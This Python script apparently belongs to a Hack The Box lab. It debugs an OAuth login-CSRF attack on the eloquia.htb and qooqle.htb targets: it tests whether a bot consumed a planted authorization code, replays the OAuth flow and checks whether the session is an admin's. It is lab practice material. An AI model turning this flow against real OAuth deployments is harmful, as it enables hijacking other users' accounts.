#!/usr/bin/env python3
"""
Debug OAuth flow - check if code was consumed and what happens on login
"""
import requests
import re
import sys
import os

TARGET_ELOQUIA = "http://eloquia.htb"
TARGET_QOOQLE = "http://qooqle.htb"
CLIENT_ID = "riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi"
REDIRECT_URI = "http://eloquia.htb/accounts/oauth2/qooqle/callback/"

TMP_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tmp")

def get_csrf(html):
    match = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', html)
    return match.group(1) if match else None

def load_credentials():
    try:
        with open(os.path.join(TMP_DIR, "username.txt")) as f:
            username = f.read().strip()
        with open(os.path.join(TMP_DIR, "password.txt")) as f:
            password = f.read().strip()
        return username, password
    except:
        return None, None

def main():
    username, password = load_credentials()
    if not username:
        print("[-] No credentials found")
        sys.exit(1)

    print(f"[*] Using credentials: {username}")

    # Check if we have a saved OAuth code
    code_file = os.path.join(TMP_DIR, "oauth_code.txt")
    if os.path.exists(code_file):
        with open(code_file) as f:
            saved_code = f.read().strip()
        print(f"[*] Saved OAuth code: {saved_code[:20]}...")

        # Try to use the saved code directly
        print("\n[*] Testing if saved code is still valid (should be consumed if bot used it)...")
        test_session = requests.Session()
        callback_url = f"{REDIRECT_URI}?code={saved_code}"
        resp = test_session.get(callback_url, allow_redirects=True)
        print(f"    Response URL: {resp.url}")
        print(f"    Status: {resp.status_code}")
        print(f"    Has session cookie: {'sessionid' in test_session.cookies}")
        if 'error' in resp.url or 'invalid' in resp.text.lower():
            print(f"    [+] Code appears consumed/invalid - bot likely used it!")
        elif 'sessionid' in test_session.cookies:
            print(f"    [!] Code still works - bot may NOT have used it!")

    # Now do full OAuth flow
    print("\n" + "="*50)
    print("[*] Testing full OAuth login flow...")

    # Step 1: Login to Qooqle
    print("\n[1] Logging into Qooqle...")
    qooqle = requests.Session()
    login_page = qooqle.get(f"{TARGET_QOOQLE}/login/")
    csrf = get_csrf(login_page.text)
    qooqle.post(f"{TARGET_QOOQLE}/login/",
        data={
            'csrfmiddlewaretoken': csrf,
            'username': username,
            'password': password
        },
        headers={'Referer': f"{TARGET_QOOQLE}/login/"}
    )
    if 'sessionid' in qooqle.cookies:
        print("    [+] Logged into Qooqle")
    else:
        print("    [-] Qooqle login failed")
        sys.exit(1)

    # Step 2: Start OAuth from Eloquia
    print("\n[2] Starting OAuth from Eloquia...")
    eloquia = requests.Session()
    oauth_init = eloquia.get(f"{TARGET_ELOQUIA}/accounts/oauth2/qooqle/authorize/",
                            allow_redirects=False)
    qooqle_auth_url = oauth_init.headers.get('Location', '')
    print(f"    Redirect to: {qooqle_auth_url[:80]}...")

    # Step 3: Authorize on Qooqle
    print("\n[3] Authorizing on Qooqle...")
    auth_page = qooqle.get(qooqle_auth_url)
    print(f"    Auth page status: {auth_page.status_code}")

    # Check if already authorized (auto-redirects) vs needs approval
    if 'code=' in auth_page.url:
        print("    [+] Already authorized - got code directly")
        callback_url = auth_page.url
    else:
        csrf = get_csrf(auth_page.text)
        if not csrf:
            print("    [-] No CSRF token - might already be authorized")
            print(f"    Page content preview: {auth_page.text[:500]}")
            sys.exit(1)

        resp = qooqle.post(qooqle_auth_url,
            data={
                'csrfmiddlewaretoken': csrf,
                'redirect_uri': REDIRECT_URI,
                'scope': 'read write',
                'client_id': CLIENT_ID,
                'response_type': 'code',
                'allow': 'Authorize'
            },
            headers={'Referer': qooqle_auth_url},
            allow_redirects=False
        )
        callback_url = resp.headers.get('Location', '')
        print(f"    Callback URL: {callback_url[:80]}...")

    # Step 4: Follow callback
    print("\n[4] Following callback on Eloquia...")
    resp = eloquia.get(callback_url, allow_redirects=True)
    print(f"    Final URL: {resp.url}")
    print(f"    Status: {resp.status_code}")
    print(f"    Has session: {'sessionid' in eloquia.cookies}")

    if 'sessionid' in eloquia.cookies:
        # Check who we are
        print("\n[5] Checking identity...")
        profile = eloquia.get(f"{TARGET_ELOQUIA}/accounts/profile/")

        # Try multiple ways to find username
        username_match = re.search(r'value="([^"]+)"[^>]*id="id_username"', profile.text)
        if not username_match:
            username_match = re.search(r'id="id_username"[^>]*value="([^"]+)"', profile.text)
        if not username_match:
            username_match = re.search(r'Howdy,\s*(\w+)', profile.text)
        if not username_match:
            username_match = re.search(r'username["\s:]+["\']?(\w+)', profile.text)

        if username_match:
            logged_in_as = username_match.group(1)
            print(f"    [*] Logged in as: {logged_in_as}")
            if 'admin' in logged_in_as.lower():
                print(f"    [+] SUCCESS - Got admin!")
            else:
                print(f"    [-] Not admin - OAuth CSRF may not have worked")
        else:
            print(f"    [?] Could not determine username")
            print(f"    Profile URL: {profile.url}")
            # Print part of the profile page to debug
            print(f"    Profile snippet: {profile.text[500:1500]}")
    else:
        print("\n[-] No session obtained")
        print(f"    Response snippet: {resp.text[:500]}")

if __name__ == "__main__":
    main()
